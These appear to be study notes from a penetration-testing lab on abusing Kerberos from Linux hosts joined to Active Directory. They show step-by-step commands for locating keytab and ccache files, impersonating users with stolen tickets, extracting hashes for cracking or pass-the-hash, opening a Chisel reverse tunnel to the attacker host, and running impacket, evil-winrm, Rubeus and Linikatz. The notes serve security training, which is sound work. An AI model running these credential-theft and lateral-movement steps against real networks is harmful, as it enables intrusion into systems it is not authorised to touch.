
A Linux computer connected to Active Directory commonly uses Kerberos as authentication.

A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.

---
## Kerberos on Linux

Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory

Location of the Kerberos ticket is stored in the environment variable : `KRB5CCNAME`

[ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

Another everyday use of Kerberos in Linux is with [keytab](https://kb.iu.edu/d/aumh) files

A [keytab](https://kb.iu.edu/d/aumh) is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files.

[Keytab](https://kb.iu.edu/d/aumh) files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file

## Scenario

LINUX01 <-> MS01 <-> PWNBOX

#### Linux Auth from MS01 Image

#### Linux Auth via Port Forward

```shell-session
ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

---
## Identifying Linux and Active Directory Integration

Linux machine is domain joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.

#### realm - Check If Linux Machine is Domain Joined

```shell-session
realm list
```

[sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) identify if it is domain joined. We can read this [blog post](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) for more details. 

#### PS - Check if Linux Machine is Domain Joined

```shell-session
ps -ef | grep -i "winbind\|sssd"
```

## Finding Kerberos Tickets in Linux

## Finding Keytab Files

#### Using Find to Search for Files with Keytab in the Name

```shell-session
find / -name *keytab* -ls 2>/dev/null
```

#### Identifying Keytab Files in Cronjobs

`keytab` files is in automated scripts configured using a cronjob or any other Linux service.

```shell-session
crontab -l
```

```shell-session
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

```shell-session
 cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

```shell-session
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

-  [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use `kinit` to import a `keytab` into our session and act as the user.


## Finding ccache Files

A credential cache or [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts

#### Reviewing Environment Variables for ccache Files.

```shell-session
env | grep -i krb5
```

#### Searching for ccache Files in /tmp

```shell-session
ls -la /tmp
```

---
## Abusing KeyTab Files

#### Listing keytab File Information

```shell-session
klist -k -t /opt/specialfiles/carlos.keytab 
```

#### Impersonating a User with a keytab

```shell-session
klist 
```

```shell-session
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

#### Connecting to SMB Share as Carlos

```shell-session
smbclient //dc01/carlos -k -c ls
```


### Keytab Extract

We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type .keytab files, which may be used to authenticate Linux boxes to Kerberos.

 information such as the realm, Service Principal, Encryption Type, and Hashes.

#### Extracting Keytab Hashes with KeyTabExtract

```shell-session
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

With the **NTLM hash, we can perform a Pass the Hash attack**. With the A**ES256 or AES128 hash, we can forge our tickets using Rubeus** or attempt to **crack the hashes** to obtain the plaintext password.

 quick way to decrypt passwords is with online repositories such as [https://crackstation.net/](https://crackstation.net/), which contains billions of passwords.

#### Log in as Carlos

```shell-session
su - carlos@inlanefreight.htb
```

Then obtain more hashes.

---

## Abusing Keytab ccache

#### Privilege Escalation to Root

```shell-session
ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
```

```shell-session
sudo su
```

#### Looking for ccache Files

```shell-session
ls -la /tmp
```

#### Identifying Group Membership with the id Command

```shell-session
id julio@inlanefreight.htb
```

#### Importing the ccache File into our Current Session

```shell-session
klist
```

```shell-session
cp /tmp/krb5cc_647401106_I8I133 .
```

```shell-session
 export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```

```shell-session
klist
```
```shell-session
smbclient //dc01/C$ -k -c ls -no-pass
```

## Using Linux Attack Tools with Kerberos

our attack host doesn't have a connection to the `KDC/Domain Controller`, and we can't use the Domain Controller for name resolution. To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.

#### Host File Modified

```shell-session
cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

#### Proxychains Configuration File


```shell-session
cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

#### Download Chisel to our Attack Host


```shell-session
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
```

```shell-session
gzip -d chisel_1.7.7_linux_amd64.gz
```

```shell-session
 mv chisel_* chisel && chmod +x ./chisel
```

```shell-session
sudo ./chisel server --reverse
```

#### Connect to MS01 with xfreerdp

```shell-session
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

#### Execute chisel from MS01

```cmd-session
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

#### Setting the KRB5CCNAME Environment Variable

```shell-session
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

### Impacket

#### Using Impacket with proxychains and Kerberos Authentication

```shell-session
proxychains impacket-wmiexec dc01 -k
```

### Evil-Winrm

#### Installing Kerberos Authentication Package

```shell-session
sudo apt-get install krb5-user -y
```

#### Default Kerberos Version 5 realm

#### Default Kerberos Version 5 realm

#### Kerberos Configuration File for INLANEFREIGHT.HTB

```shell-session
cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```


#### Using Evil-WinRM with Kerberos

```shell-session
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## Miscellaneous

If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them

#### Impacket Ticket Converter

```shell-session
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

Note: We can do the reverse operation by first selecting a `.kirbi file`
#### Importing Converted Ticket into Windows Session with Rubeus

```cmd-session
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

## Linikatz

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory.
- `Mimikatz` to UNIX environments.
- root required
This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with `linikatz`

```shell-session
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
```

```shell-session
/opt/linikatz.sh
```




